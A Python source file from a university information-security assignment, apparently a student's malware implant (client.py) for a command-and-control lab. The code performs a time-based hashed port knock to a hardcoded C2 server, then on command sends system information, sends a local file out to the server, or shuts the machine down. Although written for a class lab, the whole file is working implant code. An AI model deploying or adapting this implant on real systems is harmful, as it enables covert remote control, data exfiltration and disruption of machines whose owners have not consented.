'''
CSC 4380 Fa'23 Info Sec
Assignment 5
Malware C2

Jason Mensah-Homiah
UVA-Wise '24
11/08/2023

Introduction:
    In this assignment, I designed a Command and Control (C2) system to simulate malware on a Local Area Network (LAN) Virtual Machine (VM). 
    The system consists of two components—a C2 server (server.py) deployed on a Wide Area Network (WAN) VM and a malware implant (client.py) 
    deployed on the LAN VM. The primary functionality of the C2 system involves listening for connections, implementing a port-knock 
    sequence, and executing predefined commands on the malware implant.
    

Summary:
    This is the malware client that communicates with the C2 server.
    You can edit the server's IP address in the self explanatory variable (Server IP). 
    
    For option 2, this code assumes that a file named "file.txt" exists in the sae directory as the code. 
    
    I kept some print statements to make reviewing and following the code easy.
    
    

Dependencies: 
    This code was written to be run on linux.
    
    If you try running it and get port in use errors (which are false positives), 
    type ctrl + O in terminal, and try again.
   
    If you lack any of the python packages (socket, hashlib, time, platofrm, subprocess, os),
    then install them with pip3 or pip.

Usage:

    Execute in Terminal:    python3 client.py

'''



import socket
import hashlib
import time
import platform
import subprocess
import os

# Define the server's IP address and port
SERVER_IP = '192.168.200.8'
SERVER_PORT = 8007

# Function to send a sequence to the server
def send_sequence():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((SERVER_IP, SERVER_PORT))

        # First stage: Send the hash of "knock" + current minute
        stage1_hash = hashlib.sha256(f"knock{time.gmtime().tm_min}".encode()).hexdigest()
        client_socket.send(stage1_hash.encode())
        time.sleep(6)

        # Second stage: Send the hash of the current hour
        stage2_hash = hashlib.sha256(f"{time.gmtime().tm_hour}knock".encode()).hexdigest()
        client_socket.send(stage2_hash.encode())
        time.sleep(9)

        # Third stage: Send the hash of the current minute + current day
        stage3_hash = hashlib.sha256(f"{time.gmtime().tm_min}{time.gmtime().tm_mday}".encode()).hexdigest()
        client_socket.send(stage3_hash.encode())

        # Receive the server's response
        response = client_socket.recv(1024).decode()

        # Validate the server's response
        if validate_response(response):
            waiting_for_command(client_socket)
        else:
            print("Invalid server response")

# Function to validate the server's response
def validate_response(response):
    return response == f"{time.gmtime().tm_min}s"  #Checks if the server's response is = the current minute

# Function to handle the "Waiting for command" state
def waiting_for_command(client_socket):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_auth_socket:
        client_auth_socket.connect((SERVER_IP, 8008))
        while True:
            time.sleep(1)  # Adjust sleep duration as needed
            option = client_auth_socket.recv(1024).decode()
            execute_option(client_auth_socket, option)

# Function to execute the selected option
def execute_option(client_socket, option):
    print("T option: " + option)
    if option == "opt1":
        print("option 1 selected")
        machine_info = get_machine_info()
        client_socket.send(machine_info.encode())
        print(machine_info)
    elif option == "opt2":
        send_file(client_socket, "file.txt")
        client_socket.send(b'Done999')

    elif option == "opt4":
        client_socket.send(str("Server Shutting down").encode())
        os.system("shutdown now") #Shutdown the client immediately. 
     
    else:
        print("Invalid option. Please try again.")

    waiting_for_command(client_socket)

# Function to get machine information
def get_machine_info():
    try:
        system_info = platform.system()
        system_uname = platform.uname()
        system_platform = platform.platform()
        return_string =  "\n\nSystem_info:\n" + system_info + "\n\nuname:\n" + str(system_uname) + "\n\nplatform:\n" + system_platform + "\n\n"
        return return_string
    except Exception as e:
        return f"Error getting machine info: {str(e)}"

# Function to send a file to the server
def send_file(client_socket, filename):
    time.sleep(3) #Delay send for 3 seconds
    with open(filename, 'rb') as file:
        data = file.read(1024)
        while data:
            client_socket.send(data)
            data = file.read(1024)
        print(f"File '{filename}' sent to the server.")           

 
if __name__ == '__main__':
    send_sequence()
